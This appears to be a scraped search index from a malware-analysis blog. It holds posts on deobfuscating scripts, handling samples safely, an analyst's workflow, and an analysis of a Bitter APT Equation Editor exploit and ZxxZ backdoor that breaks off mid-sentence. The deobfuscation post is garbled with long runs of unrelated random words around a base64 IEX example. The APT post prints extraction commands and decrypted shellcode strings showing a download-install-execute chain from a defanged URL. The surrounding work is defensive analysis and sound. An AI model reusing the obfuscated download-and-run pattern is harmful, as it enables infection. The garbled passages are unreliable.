fallowing crotchet tendinitis's mamas jinricksha Masses lankiness antedated fomentation installs Pythagoras Einst","date":"2022-07-09","objectID":"/2022/07/malware-script-deobfuscation/:4:2","tags":["Deobfuscation","Scripting","Malware"],"title":"Deobfuscating Scripts","uri":"/2022/07/malware-script-deobfuscation/"},{"categories":["Docs"],"content":"PowerShell PowerShell is a scripting language and shell included in the Windows operating system by Microsoft. PowerShell is a task automation and configuration management program from Microsoft, consisting of a command-line shell and the associated scripting language. - Wikipedia It is still possible to access COM objects as discussed earlier in this guide. However, it is often not necessary with PowerShell due to the other built-in commands and access to the .NET interpreter. When deobfuscating PowerShell, look out for IEX and Invoke-Expression, as these can be used to directly evaluate code. $code = \"Write-Host 'Hello World!';\"; Invoke-Expression $code; As with the other direct evaluations, we can simply replace it with something to print to the console, like Write-Host. $code = \"Write-Host 'Hello World!';\"; Write-Host $code; Example # Honeywell's Pennsylvania parser vortex pitying fusses Kentucky wildcatting heist scalpels novel's regime's BO suckling rain's pebbled upcountry's knockout wipe manipulations hooked ageism hikers mackerel backlash's electrocution's institute typecast providently renege Darcy's retarded burps partaker underwear Fitch entertainingly crescendi envision flatbed's Lvov refuge Barron's croupiest Deborah's Astaire infirmity bafflement's Israel Magellanic headrest mischance's enlistments Jubal's plateaus henpecks influx's RDS rightfully monitoring tolerated virtually Anaheim vagabond's vibrancy's orthopaedist Damon flesh's matchbox done Texans Chris's schuss undergone disbanded ongoing Fred's thereabout Ganymede abrading Columbus Lean's soccer's spurned fleetness crude happenstance's corduroys's tooth's swipes transfuses divorcing confidantes PlayStation's disappointing Mir Lopez densities splices bladder's $code = \"Z\"+\"W\"+\"N\"+\"o\"+\"b\"+\"y\"+\"A\"+\"n\"+\"S\"+\"G\"+\"V\"+\"s\"+\"b\"+\"G\"+\"8\"+\"g\"+\"V\"+\"2\"+\"9\"+\"y\"+\"b\"+\"G\"+\"Q\"+\"h\"+\"J\"+\"y\"+\"A\"+\"+\"+\"I\"+\"G\"+\"h\"+\"l\"+\"b\"+\"G\"+\"x\"+\"v\"+\"L\"+\"n\"+\"R\"+\"4\"+\"d\"+\"A\"+\"=\"+\"=\"; # congratulations purees Clotho's vindictiveness's tucker's chaplet's Chicagoan Freida's coined Alfonso's Bedouins pawing jukebox's leaked rajah untwisting dewlap's beholder's harvests muscatel Xe heraldry Cadiz hornet belated median DP's composes miasmas occasional seamstresses raucousness vessels logical pancakes copping lopsidedness's gobbing honorific's semiconductor's Daisy riddance depredations vaccinate Alistair midlands courtyard's weakly Icahn drawls Mazzini Harold rumba's lumbago anchor zither validation gruesomer Gates's twaddle highlighted Parrish ousting chattiness single's fagot homogeneity sharper's fairground mildews UFO's Paar suspension's integer pangs Winnipeg reflex schism's oddness's ascends assigned bridled howlers brooms favor hypothesis's rehabilitated preps tinkle's honeybee consummating mortal womankind's flubbing stadium's vagabond's dressmakers governors forthrightly Algerian's IeX([Text.Encoding]::Utf8.gEtStRiNg([Convert]::fRoMbAsE64StRiNg($code))); # Cossack thumbscrew Bangui flustering insinuations semaphoring deed Heriberto's baa fixtures cutups Taipei dweeb's promptness Olin's statehouse's Shana's spiralling Perm arrayed notepaper plasticity void reenforce hummock crash pasterns tinker's idiocy shiftless cognition's pejorative's empathizes demarcates McLean's annals Reba beagles repeaters rifling vulgarer burger Wesley's incipient frizz's betray rip's uninvited Horowitz's glint credits draftee's York's Louella sooner bunion's bobcats suede staple's bacchanalian's Colombo's Salamis's conceits heckle's purchase butterscotch unpacks solarium's treatment captor's sited pushiness glittery draftiness pinup perpetrated mortars flit robbery organic's clearing Pirandello's Uganda preamble prong Leola saltshaker's hieroglyphics charade's housework accordion Armonk's colliers exoneration ham ambassadorship's Somalis ungainliness emancipate papered ","date":"2022-07-09","objectID":"/2022/07/malware-script-deobfuscation/:4:3","tags":["Deobfuscation","Scripting","Malware"],"title":"Deobfuscating Scripts","uri":"/2022/07/malware-script-deobfuscation/"},{"categories":["Docs"],"content":"Conclusion Obfuscation can be a time-consuming task, for myself I think of it like a game of Sudoku. There is enjoyment in creating orderly code and uncovering secrets. When I need a break from reverse engineering, I’ll take a task to deobfuscate a script, it always rekindles my joy of this field. ","date":"2022-07-09","objectID":"/2022/07/malware-script-deobfuscation/:5:0","tags":["Deobfuscation","Scripting","Malware"],"title":"Deobfuscating Scripts","uri":"/2022/07/malware-script-deobfuscation/"},{"categories":["Docs"],"content":"Downloads Slides ","date":"2022-07-09","objectID":"/2022/07/malware-script-deobfuscation/:6:0","tags":["Deobfuscation","Scripting","Malware"],"title":"Deobfuscating Scripts","uri":"/2022/07/malware-script-deobfuscation/"},{"categories":["Docs"],"content":"A guide on handling malware samples.","date":"2022-07-07","objectID":"/2022/07/malware-sample-handling/","tags":["Malware","Analysis"],"title":"Handling Malware Samples","uri":"/2022/07/malware-sample-handling/"},{"categories":["Docs"],"content":"When you are first starting out in malware analysis or reverse engineering, it can be a very nerve racking experience to deal with malware samples. You might always have that little voice in your head thinking… What if I double click by accident? What if I press ENTER when I was not supposed to? What if the malware breaks out of the VM? Malware is bad You don’t want to be infected, do you? If you have these little voices in your head, you are not alone. Almost everyone who has worked in the industry has this little voice bugging them every day. This guide will cover the absolute basics on handling malware samples, as well as, how to silence that little voice in your head you hear every time you start a new analysis. ","date":"2022-07-07","objectID":"/2022/07/malware-sample-handling/:0:0","tags":["Malware","Analysis"],"title":"Handling Malware Samples","uri":"/2022/07/malware-sample-handling/"},{"categories":["Docs"],"content":"Making it more “Safe” The industry will generally use two terms to describe making samples or indicators safe. These terms are neutered and defanged. The process of doing this is different for samples and indicators. ","date":"2022-07-07","objectID":"/2022/07/malware-sample-handling/:1:0","tags":["Malware","Analysis"],"title":"Handling Malware Samples","uri":"/2022/07/malware-sample-handling/"},{"categories":["Docs"],"content":"Samples To make samples safe, we will typically store them in a ZIP encrypted archive with the password infected. mkdir samples mv sample.bin samples/ zip -P infected -e -r samples.zip samples/ rm -rf samples/ ","date":"2022-07-07","objectID":"/2022/07/malware-sample-handling/:1:1","tags":["Malware","Analysis"],"title":"Handling Malware Samples","uri":"/2022/07/malware-sample-handling/"},{"categories":["Docs"],"content":"URLs For URLs we will typically show them as follows. hxxp://example[.]com/malware.php This will ensure that the URL cannot be easily clicked by an unsuspecting user. You will notice that http is replaced with hxxp and . is replaced with [.]. ","date":"2022-07-07","objectID":"/2022/07/malware-sample-handling/:1:2","tags":["Malware","Analysis"],"title":"Handling Malware Samples","uri":"/2022/07/malware-sample-handling/"},{"categories":["Docs"],"content":"IP Addresses For IP addresses we will typically show them as follows. 8.8.8[.]8 Similar to the URLs we simply replace the . with [.]. ","date":"2022-07-07","objectID":"/2022/07/malware-sample-handling/:1:3","tags":["Malware","Analysis"],"title":"Handling Malware Samples","uri":"/2022/07/malware-sample-handling/"},{"categories":["Docs"],"content":"Handling Samples Now that we have a general understanding on how samples and indicators are made “safe”. We can now discuss how to handle the samples as part of our analysis process. ","date":"2022-07-07","objectID":"/2022/07/malware-sample-handling/:2:0","tags":["Malware","Analysis"],"title":"Handling Malware Samples","uri":"/2022/07/malware-sample-handling/"},{"categories":["Docs"],"content":"Downloading Samples Typically, when we download samples they will be in a ZIP encrypted format, with the password infected. This version we can download on our host machine as there is nothing inherently malicious about it, it’s encrypted. If you wish to reduce risk even further, you can use another VM to download the malware instead of using your host machine. Once we have the encrypted version downloaded, we can move the sample to the VM we wish to perform the analysis on. Now that the encrypted version of the malware is in the VM, we can extract it there by entering the password infected. Now we are ready to perform our analysis as the malicious unencrypted sample has not touched our host machine. ","date":"2022-07-07","objectID":"/2022/07/malware-sample-handling/:2:1","tags":["Malware","Analysis"],"title":"Handling Malware Samples","uri":"/2022/07/malware-sample-handling/"},{"categories":["Docs"],"content":"Understanding the Risk Just like workers who accept risk as part of their jobs in other industries, there are hazards and risks we all accept as part of our jobs in malware analysis and reverse engineering. It is up to us to understand that these are risks of this job and do our best to mitigate what is under our control. Just like anyone on jobs that involve risk, we accept a certain amount of it when we signup to be a malware analyst or reverse engineer. These risks include, but are not limited to. Infecting yourself VM escaping malware Becoming a High Value Target (HVT) for nation-state or criminal groups You can think of malware breaking out of VMs much like getting struck by lightening, it can happen but it is a very rare occurrence. The possibility of becoming a High Value Target (HVT) for criminal or nation-state groups is why I do my best to separate my personal identity from my independent research. There are times I let people in, but it is usually based on a need. Some people may laugh at your hacker handle or alias but in my opinion it is necessary. ","date":"2022-07-07","objectID":"/2022/07/malware-sample-handling/:2:2","tags":["Malware","Analysis"],"title":"Handling Malware Samples","uri":"/2022/07/malware-sample-handling/"},{"categories":["Docs"],"content":"Conclusion We all accept a certain amount of risk in this industry, other industries also have risk they must accept. Accepting risk as part of a profession is not uncommon. However, the risk we take on in malware analysis and reverse engineering is quite different. If we want to work in this field we must learn to accept a reasonable amount of risk that comes with the job. Again, it is okay to be a little frightened as a reality check is often good for us. At the same time, understand that occurances are usually rare. ","date":"2022-07-07","objectID":"/2022/07/malware-sample-handling/:3:0","tags":["Malware","Analysis"],"title":"Handling Malware Samples","uri":"/2022/07/malware-sample-handling/"},{"categories":["Docs"],"content":"A guide to my malware analysis and reverse engineering workflow.","date":"2022-07-06","objectID":"/2022/07/malware-reversing-workflow/","tags":["Reversing","Malware","Workflow"],"title":"Malware Analysis and Reverse Engineering Workflow","uri":"/2022/07/malware-reversing-workflow/"},{"categories":["Docs"],"content":"I have noticed that there is a lot of material on individual parts of the malware analysis and reverse engineering process. However, they do not cover really what someone’s workflow is from start to finish. This guide will be an overview of my general workflow. ","date":"2022-07-06","objectID":"/2022/07/malware-reversing-workflow/:0:0","tags":["Reversing","Malware","Workflow"],"title":"Malware Analysis and Reverse Engineering Workflow","uri":"/2022/07/malware-reversing-workflow/"},{"categories":["Docs"],"content":"Prerequsites Ensure you have finished setting up your malware lab This guide is not how everyone does it, everyone will refine their own workflow, which works best for them overtime. ","date":"2022-07-06","objectID":"/2022/07/malware-reversing-workflow/:1:0","tags":["Reversing","Malware","Workflow"],"title":"Malware Analysis and Reverse Engineering Workflow","uri":"/2022/07/malware-reversing-workflow/"},{"categories":["Docs"],"content":"Methodology When working on malware it is good to have a methodology to guide your operations. Without an overall methodology, your work will fall flat as you have no purpose. It is a cool emerging field and can make your company look awesome, but at the same time, reverse engineering is time consuming and very expensive. If extra care is not given to an overall direction you can become very ineffective. People who do not know about the technical challenges malware analysis and reverse engineering pose, believe that you can send them a report on a fully reversed malware sample in a couple of hours. It is up to us to educate them that this is not the case, as always things are usually much more complex than they seem. Based on the complexity of a malware sample it could take minutes, hours, days, months, years, it really just depends! Depending on where you work there will often be different methodologies to how they strategize this process. Because of this, do not be suprised when the methodology depicted in this guide is different elsewhere. ","date":"2022-07-06","objectID":"/2022/07/malware-reversing-workflow/:2:0","tags":["Reversing","Malware","Workflow"],"title":"Malware Analysis and Reverse Engineering Workflow","uri":"/2022/07/malware-reversing-workflow/"},{"categories":["Docs"],"content":"Purpose and Output There are many purposes you can have when performing analysis like this. Detection Signatures Malware Configuration Extractors (Intelligence) Automated Unpacking Tracking Threat Actors Writing Technical Reports There are certainly other potential usecases for this kind of work. However, these would be the usecases for most. ","date":"2022-07-06","objectID":"/2022/07/malware-reversing-workflow/:2:1","tags":["Reversing","Malware","Workflow"],"title":"Malware Analysis and Reverse Engineering Workflow","uri":"/2022/07/malware-reversing-workflow/"},{"categories":["Docs"],"content":"Behavior When analyzing malware it is important to focus on its behavior. This tells us exactly what operations we can expect the malware to perform once its in a target environment. Endpoint Endpoint behavior includes but is not limited to the following properties. Process Creation File Create and Delete Registry Keys DNS TCP Communication Code Injection Network Although there are some points regarding networking in the Endpoint section, this section is about full packet inspection. This is how the malware communicates, not just to a domain or IP address but the contents of that communication and how it behaves. ","date":"2022-07-06","objectID":"/2022/07/malware-reversing-workflow/:2:2","tags":["Reversing","Malware","Workflow"],"title":"Malware Analysis and Reverse Engineering Workflow","uri":"/2022/07/malware-reversing-workflow/"},{"categories":["Docs"],"content":"Detection One of the things I pride myself on is writing meaningful detection. Imagine going to the doctor because you are feeling sick. If the doctor checks you over and only confirms you are sick or gives you a vague diagnosis without more details, it creates a poor customer experience. In the cybersecurity industry we can attribute this experience to looking at VirusTotal antivirus detection names. When I write detection, i create heuristic as well as classification signatures. This ensures we can catch more malware at a larger scale but also catch the ones we already know about and provide that diagnosis people are looking for. When executing this detection methodology, I focus on the Tools and Techniques Tactics and Procedures (TTPs). A great reference diagram for this is the pyramid of pain shown below. Pyramid of Pain There is importance for intelligence like IP addresses hash values, domain names and network/host artifacts. However, this does not lie so much in detection, it lies more in verification of behaviors as observed by tier 1 SOC analysts, as well as, tracking threat actor infrastructure. ","date":"2022-07-06","objectID":"/2022/07/malware-reversing-workflow/:2:3","tags":["Reversing","Malware","Workflow"],"title":"Malware Analysis and Reverse Engineering Workflow","uri":"/2022/07/malware-reversing-workflow/"},{"categories":["Docs"],"content":"Process When we work on malware analysis and reverse engineering it is important to have a process to keep you organized in your work. Without an overall process, it will be easy to become lost or have to redo work you have already completed. It is also important that we are cognizant about the time complexity of our process. If we obtain our goal reasonably within the first stages of this pyramid, you must justify the expense of going further up the pyramid. Time is money and reverse engineering code takes a long time but can come with additional benifits. Again, without a clear methodology and direction you could waste a lot of time and money. ","date":"2022-07-06","objectID":"/2022/07/malware-reversing-workflow/:3:0","tags":["Reversing","Malware","Workflow"],"title":"Malware Analysis and Reverse Engineering Workflow","uri":"/2022/07/malware-reversing-workflow/"},{"categories":["Docs"],"content":"Overview The following graph provides an overview of the general process I follow. The graph above can be descrived as follows. Triage Identify Filetype Determine which tools to use for further analysis Malware Analysis Static Analysis Use static tools based on filetype Dynamic Analysis Execute the malware and observe its behavior Malicious Intent Determine if the sample has malicious intent Reversing Triage Determine the scope of work Actual Reversing Scoped Result ","date":"2022-07-06","objectID":"/2022/07/malware-reversing-workflow/:3:1","tags":["Reversing","Malware","Workflow"],"title":"Malware Analysis and Reverse Engineering Workflow","uri":"/2022/07/malware-reversing-workflow/"},{"categories":["Docs"],"content":"Malware Analysis Malware analysis is a process to triage the beginning stages is to ensure that we have a high level overview of the sample that we will use later for reverse engineering. This saves us time in the process as it provides reliable situational awareness. Identify Filetype We need to determine what kind of file we are working with as it will aid us in determing the tooling we will be using moving forward. Suggested tools. Detect it Easy Linux file command Binwalk sudo apt install -y binwalk Analysis The malware analysis stage for me depicts the part of the process where we start investigating for malicious intent. This process includes analysis of the sample using both static and dynamic analysis. However, it is a more surface level approach than reverse engineering. Static Before we can perform static analysis we must be able to understand what it means. Static program analysis is the analysis of computer software performed without executing any programs, in contrast with dynamic analysis, which is performed on programs during their execution. - https://en.wikipedia.org/wiki/Static_program_analysis This means we perform analysis without executing the sample. Suggested tools. PEStudio PEBear Detect it Easy 7zip YARA VirusTotal MalwareBazaar What we are looking for are indicators that clearly show malicious intent. Dynamic Before we can perform dynamic analysis we must be able to understand its meaning first. Dynamic program analysis is the analysis of computer software that is performed by executing programs on a real or virtual processor. For dynamic program analysis to be effective, the target program must be executed with sufficient test inputs to cover almost all possible outputs. https://en.wikipedia.org/wiki/Dynamic_program_analysis Now there are two types of dynamic analysis I like to do, the first one is automated dynamic analysis. For automated dynamic analysis I will submit the sample I have to a sandbox service or my own sandbox system. Let us first understand what sanboxing is at a high level with the following definition. Sandboxing is used to test code or applications that could be malicious before serving it up to critical devices. In cybersecurity, sandboxing is used as a method to test software which would end up being categorized as “safe” or “unsafe” after the test. - Malware Bytes Now that we understand what sandboxing means I recommend the following resources. AnyRun HybridAnalysis Cape Sandbox Triage Joe Sandbox Once you execute the sample in a sandbox, you will want to hunt for malicious intent. The other type of dynamic analysis is to perform it manually on your own lab machine. To monitor the activity you can use tools like Wireshark for network and Procmon for endpoint behaviors. This type of dynamic analysis can involve manipulating the malware by responding to it over the network or placing files or other artifacts in places it needs them to enable further execution. Malicious Intent After we finish our static and dynamic malware analysis we need to indicate if the sample has malicious intent or not. If we do determine it has malicious intent, we have some decisions on tasks we need to make. Refer to the Purposes and Output section and complete what is needed Escalate to Reverse Engineering if needed Additional refrences for malicious intent. Mire LOLBAS Depending on your scope of work and standard operating procedures and overall strategy, these will be the tasks you will need to decide you will complete or not. NOTE: It is not always nessassary to escalate to reverse engineering, it depends again on the scope of work you receive and the complexity of the malware and the results you need. So the process can totally stop here and that’s okay too! ","date":"2022-07-06","objectID":"/2022/07/malware-reversing-workflow/:3:2","tags":["Reversing","Malware","Workflow"],"title":"Malware Analysis and Reverse Engineering Workflow","uri":"/2022/07/malware-reversing-workflow/"},{"categories":["Docs"],"content":"Reverse Engineering Reverse engineering can be defined as follows. Reverse engineering is a process or method through which one attempts to understand through deductive reasoning how a previously made device, process, system, or piece of software accomplishes a task with very little insight into exactly how it does so. - https://en.wikipedia.org/wiki/Reverse_engineering Triage Review This kind of triage is very different to triage for malware analysis. The goal of triage with reverse engineering is to use the information to help you identify areas of key interest in the malicious binary. For example, if the malware analysis triage notes indicate that the malware uses ws2_32.dll for communication, we can look into cross references for these API calls in the binary. Once we have mapped out what tasks we wish to perform, we can move to the next step. Reversing In this stage we start actually reverse engineering the malware, typically we will use tools like Ghidra, IDA Pro and DNSpy to decompile the binary. We will use these decompilers to create pseudo code. In computer science, pseudocode is a plain language description of the steps in an algorithm or another system. Pseudocode often uses structural conventions of a normal programming language, but is intended for human reading rather than machine reading. This code is an approximation of what the original code may look like. It is up to us to clean this pseudo code up so we can make it more understandable for us humans to read. This is a whole process of its own and we will not cover these specific principals in this workflow guide. We will save this for the reverse engineering guide. Once completed, refer to the Purposes and Output section and complete what is needed. ","date":"2022-07-06","objectID":"/2022/07/malware-reversing-workflow/:3:3","tags":["Reversing","Malware","Workflow"],"title":"Malware Analysis and Reverse Engineering Workflow","uri":"/2022/07/malware-reversing-workflow/"},{"categories":["Docs"],"content":"Tips and Tricks Here are some basic tips and tricks to help you stay organized in this process. ","date":"2022-07-06","objectID":"/2022/07/malware-reversing-workflow/:4:0","tags":["Reversing","Malware","Workflow"],"title":"Malware Analysis and Reverse Engineering Workflow","uri":"/2022/07/malware-reversing-workflow/"},{"categories":["Docs"],"content":"Standardized Analysis Folder Structure When I start a new task like this I create a folder that contains the following structure. docs - a folder containing documentation from public articles to and own notes pcaps - packet capture files samples - samples from the analysis, which may include multiple stages scripts - scripts that help me automate the process projects - contains project files for Ghidra, IDA and more With this folder structure I’m able to know where I am and where I’m going. ","date":"2022-07-06","objectID":"/2022/07/malware-reversing-workflow/:4:1","tags":["Reversing","Malware","Workflow"],"title":"Malware Analysis and Reverse Engineering Workflow","uri":"/2022/07/malware-reversing-workflow/"},{"categories":["Docs"],"content":"Standardized Decompiler Code Style When working in Ghidra or IDA Pro it’s important for me to standardize how I name functions and variables in the pseudo code. Personally I keep this consistent with the standards as deemed by the operating system’s programming guides. This ensures that the documentation and the style guidelines is easily accessable and understood by everyone. ","date":"2022-07-06","objectID":"/2022/07/malware-reversing-workflow/:4:2","tags":["Reversing","Malware","Workflow"],"title":"Malware Analysis and Reverse Engineering Workflow","uri":"/2022/07/malware-reversing-workflow/"},{"categories":["Docs"],"content":"Comments When working in Ghidra, IDA Pro or any other tool that allows you to make comments. Write lots of comments. This will keep you organized so that you know exactly where you are. If there are note taking features in the software you are using, take advantage of it. ","date":"2022-07-06","objectID":"/2022/07/malware-reversing-workflow/:4:3","tags":["Reversing","Malware","Workflow"],"title":"Malware Analysis and Reverse Engineering Workflow","uri":"/2022/07/malware-reversing-workflow/"},{"categories":["Docs"],"content":"Taking Notes As I work through these processes, I will keep notes, typically in markdown format to keep myself organized. There are many different tools you can use to do this. However, I use Obsidian at the moment due to it’s wide variety of features. ","date":"2022-07-06","objectID":"/2022/07/malware-reversing-workflow/:4:4","tags":["Reversing","Malware","Workflow"],"title":"Malware Analysis and Reverse Engineering Workflow","uri":"/2022/07/malware-reversing-workflow/"},{"categories":["Docs"],"content":"Sharing your Work (TLP) When working with malware it is always a good idea to understand what the sharing rights of the samples you are working on. TLP Usage Sharing TLP:RED Sources may use TLP:RED when information cannot be effectively acted upon by additional parties, and could lead to impacts on a party’s privacy, reputation, or operations if misused. Recipients may not share TLP:RED information with any parties outside of the specific exchange, meeting, or conversation in which it was originally disclosed. In the context of a meeting, for example, TLP:RED information is limited to those present at the meeting. In most circumstances, TLP:RED should be exchanged verbally or in person. TLP:AMBER Sources may use TLP:AMBER when information requires support to be effectively acted upon, yet carries risks to privacy, reputation, or operations if shared outside of the organizations involved. Recipients may only share TLP:AMBER information with members of their own organization, and with clients or customers who need to know the information to protect themselves or prevent further harm. Sources are at liberty to specify additional intended limits of the sharing: these must be adhered to. TLP:GREEN Sources may use TLP:GREEN when information is useful for the awareness of all participating organizations as well as with peers within the broader community or sector. Recipients may share TLP:GREEN information with peers and partner organizations within their sector or community, but not via publicly accessible channels. Information in this category can be circulated widely within a particular community. TLP:GREEN information may not be released outside of the community. TLP:WHITE Sources may use TLP:WHITE when information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard copyright rules, TLP:WHITE information may be distributed without restriction. When we share our reports, signatures and more we will typically apply Traffic Light Protocol (TLP) to the content. This way other people in the community can understand how they are able to use and share the content. ","date":"2022-07-06","objectID":"/2022/07/malware-reversing-workflow/:5:0","tags":["Reversing","Malware","Workflow"],"title":"Malware Analysis and Reverse Engineering Workflow","uri":"/2022/07/malware-reversing-workflow/"},{"categories":["Docs"],"content":"Conclusion When starting out for the first time it can be a daunting task even to begin understanding what someone’s workflow may look like beginning to end. This guide hopefully helps you create your own workflow that makes sense for you. ","date":"2022-07-06","objectID":"/2022/07/malware-reversing-workflow/:6:0","tags":["Reversing","Malware","Workflow"],"title":"Malware Analysis and Reverse Engineering Workflow","uri":"/2022/07/malware-reversing-workflow/"},{"categories":["Malware"],"content":"An analysis of a Bitter APT maldoc exploit, ZxxZ backdoor and controling it with our own C2 server.","date":"2022-06-26","objectID":"/2022/06/bitter-apt-zxxz-backdoor/","tags":["Malware","Reversing","Bitter","APT"],"title":"Making Fun of Your APT Malware - Bitter APT Using ZxxZ Backdoor to Target Pakistan Public Accounts Committee","uri":"/2022/06/bitter-apt-zxxz-backdoor/"},{"categories":["Malware"],"content":"Introduction Bitter APT (T-APT-17/APT-C-08/Orange Yali) is a group known to operate in South Asia and is suspected to be an Indian 🇮‍🇳 APT. They primarialy target Pakistan 🇵‍🇰, Saudi Arabia 🇸‍🇦 and China. ","date":"2022-06-26","objectID":"/2022/06/bitter-apt-zxxz-backdoor/:1:0","tags":["Malware","Reversing","Bitter","APT"],"title":"Making Fun of Your APT Malware - Bitter APT Using ZxxZ Backdoor to Target Pakistan Public Accounts Committee","uri":"/2022/06/bitter-apt-zxxz-backdoor/"},{"categories":["Malware"],"content":"Analysis This will be an indepth analysis of Bitter APT’s backdoor named ZxxZ. We will cover almost every aspect of the attack chain including, exploit shellcode analysis, building our own C2 server to communicate with the malware and writing detection signatures for the community. ","date":"2022-06-26","objectID":"/2022/06/bitter-apt-zxxz-backdoor/:2:0","tags":["Malware","Reversing","Bitter","APT"],"title":"Making Fun of Your APT Malware - Bitter APT Using ZxxZ Backdoor to Target Pakistan Public Accounts Committee","uri":"/2022/06/bitter-apt-zxxz-backdoor/"},{"categories":["Malware"],"content":"Situational Awareness ShadowChasing1 posted on Twitter of about new activity from the group. Today our researchers have found new sample which belongs to #Bitter #APT group ITW:bf1a905e11f4d44de8bd2e0a6f383ed5 filename:PAC Advisory Committee Report.doc URL: hxxps://sbss.com.pk/gts/bd.msi hxxp://subscribe.tomcruefrshsvc.com/VcvNbtgRrPopqSD/SzWvcxuer/userlog.php — Shadow Chaser Group (@ShadowChasing1) January 4, 2022 I decided to have a closer look just for fun. 😅 ","date":"2022-06-26","objectID":"/2022/06/bitter-apt-zxxz-backdoor/:2:1","tags":["Malware","Reversing","Bitter","APT"],"title":"Making Fun of Your APT Malware - Bitter APT Using ZxxZ Backdoor to Target Pakistan Public Accounts Committee","uri":"/2022/06/bitter-apt-zxxz-backdoor/"},{"categories":["Malware"],"content":"Infection Chain The sample is a RTF document purporting to be a Program Advisory Comittee (PAC) report. Based on some quick googling, Pakistan 🇵‍🇰 does have a Public Accounts Comittee. The PAC is responsible for regulating the use of public funds. If you are of course an adversary to Pakistan 🇵‍🇰, involving yourself in such afairs gives you better insight into the financial structure of a country. I’m not an expert in international affairs so if this is incorrect please DM me on Twitter and I’ll make any nessasary corrections to this analysis. The exploit shellcode will download a MSI installer, which extracts a CAB Archive containing the final Portable Executable (PE) payload. ","date":"2022-06-26","objectID":"/2022/06/bitter-apt-zxxz-backdoor/:2:2","tags":["Malware","Reversing","Bitter","APT"],"title":"Making Fun of Your APT Malware - Bitter APT Using ZxxZ Backdoor to Target Pakistan Public Accounts Committee","uri":"/2022/06/bitter-apt-zxxz-backdoor/"},{"categories":["Malware"],"content":"Exploitation The initial sample PAC Advisory Committee Report.doc (sample_0.bin), is an RTF document containing the Equation Editor exploit (CVE-2017-1182). Although this exploit is quite old now, it is still used by threat actors to this day. Extracting Shellcode The exploit exists in object 4 in the RTF document and can be identified using rtfdump. rtfdump.py --objects sample_0.doc 1: Name: b'Equation.3\\x00' Magic: b'd0cf11e0' Size: 3584 Hash: md5 32a758aab375df78e25fbee9d6db9ec4 Now that we have identified the suspicious OLE object, let’s extract it. rtfdump.py -s 4 -H -c \"0x23:0xe23\" -d sample_0.doc \u003e sample_1.bin file sample_1.bin sample_1.bin: Composite Document File V2 Document, Cannot read section info The first order of business is to check this out with oledir. oledir sample_1.bin This identifies to us that the CLSID 0002CE02-0000-0000-C000-000000000046 is being used in Root Entry and is likely related to CVE-2017-1182. Now to extract object 4 from the OLE, which contains the shellcode. oledump.py sample_1.bin 1: 102 '\\x01CompObj' 2: 20 '\\x01Ole' 3: 6 '\\x03ObjInfo' 4: 741 'Equation Native' oledump.py -s 4 -d sample_1.bin \u003e sample_2.bin Seeing attacks like this many times now, since there is no visible URL the shellcode likely is encrypted. It never hurts to attempt a XOR bruteforce to see if you are successful or not. xorbruteforcer.py sample_2.bin | strings This yields us the following strings with a 0xff XOR key: \u003eGetPu ddreu CreateDirectoryA C:\\$Jz LoadLibraryA msi.dll MsiSetInternalUI MsiInstallProductA hATSNhI=NOhITCAT hxxp://sbss[.]com[.]pk/gts/bd[.]msi FileA C:\\$Gts\\gwsapip.exe C:\\$Gts\\gw LoadLibraryA Shell32.dll ShellExecuteA C:\\$Gts\\gwsapip.exe C:\\Windows\\explorer open This is a common mistake amongst threat actors from crimeware groups to APTs. We attack low skill encryption like this with pre-existing tools. Not to mention that yara also has XOR string functionality. Using VirusTotal the URL hxxp://sbss[.]com[.]pk/gts/bd[.]msi provides us a Body SHA256 of b026a255b2e17fb0c608f1265837e425ea89cc7f661975c6a0d9051e917f4611, which can be found here. Alright, we know where to find the next stage. However, let’s go a little deeper into analyzing the shellcode. Shellcode Analysis Once the malicious RTF document is opened and the user clicks Enable Editing, the eqnedt32.exe process will be created. The buffer is overwritten and the shellcode will then be executed. In the OLE object we find the bytes b2 13 40 00, which stand out as an interesting pointer to 0x004013b2 as usually the address space for eqnedt32.exe will be in this range. This is easily possible because the DLL Characteristics of eqnedt32.exe is not compiled with ASLR or IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE enabled. Making the exploit more reliable. 00000900 1c 00 00 00 02 00 22 c2 cc 0e 00 00 00 00 00 00 |......\".........| 00000910 00 00 00 00 cc 6f 62 00 00 00 00 00 03 01 01 03 |.....ob.........| 00000920 0a 0a 01 04 ff ff ff ff ff ff ff ff ff ff ff ff |................| 00000930 ff ff ff ff ff ff ff ff ff ff d2 ce 44 00 e0 a3 |............D...| 00000940 45 00 2a d0 00 ff 00 00 00 00 01 03 0e 00 00 01 |E.*.............| 00000950 03 0d 00 00 01 12 83 b8 c0 44 00 e0 a3 45 00 d2 |.........D...E..| 00000960 ce 44 00 00 40 46 00 6c 3f 44 00 b2 13 40 00 49 |.D..@F.l?D...@.I| After setting a breakpoint in the debugger on the aforementioned address, we hit a few return instructions and then this decryption routine. 00464242 | B8 18404600 | mov eax,eqnedt32.464018 | 00464247 | B9 2A020000 | mov ecx,22A | 0046424C | F610 | not byte ptr ds:[eax] | 0046424E | 40 | inc eax | 0046424F | E2 FB | loop eqnedt32.46424C | 00464251 | 68 18404600 | push eqnedt32.464018 | 00464256 | C3 | ret | What we thought before was an XOR operation is actually in this case is a not operation. NOT - Performs a bitwise NOT operation (each 1 is set to 0, and each 0 is set to 1) on the destination operand and stores the result in the destination operand location. The destination operand","date":"2022-06-26","objectID":"/2022/06/bitter-apt-zxxz-backdoor/:2:3","tags":["Malware","Reversing","Bitter","APT"],"title":"Making Fun of Your APT Malware - Bitter APT Using ZxxZ Backdoor to Target Pakistan Public Accounts Committee","uri":"/2022/06/bitter-apt-zxxz-backdoor/"},{"categories":["Malware"],"content":"Post Exploitation This section in the analysis will cover the post exploitation behavior of Bitter APT’s ZxxZ backdoor. MSI Installer The MSI installer contains the file sample_5.bin, which is a Cabinet (or CAB) archive file for Windows. Once extracted, we get sample_6.bin, which is a Windows Portable Executable (PE). This can all be extracted using 7zip and make it easy enough for us to gain access to the payload. Payload Triage We have finally arrived at the payload sample_6.bin. I used floss on the executable and got the following interesting strings. floss sample_6.bin subscribe[.]tomcruefrshsvc[.]com update.exe Updates uer/sDeRcEwwQaAsSN.php?txt= userlog.php?id= WqeC812CCvU/ systemlog systemlog tmp.exe This might be the C2 server and some of it’s URI paths and parameters. Opening sample_6.bin in PEBear, shows us that ws2_32.dll is present in the imports. This may give us easier insight to where the C2 communication is happening. We can now hypothesize that this is the payload we are looking for. Initialization Once executed, it will use user32.LoadStringA to use strings from the resource string table. These strings indicate the project name is NewProject. These kind of artifacts are typically left behind when an application template code in Visual 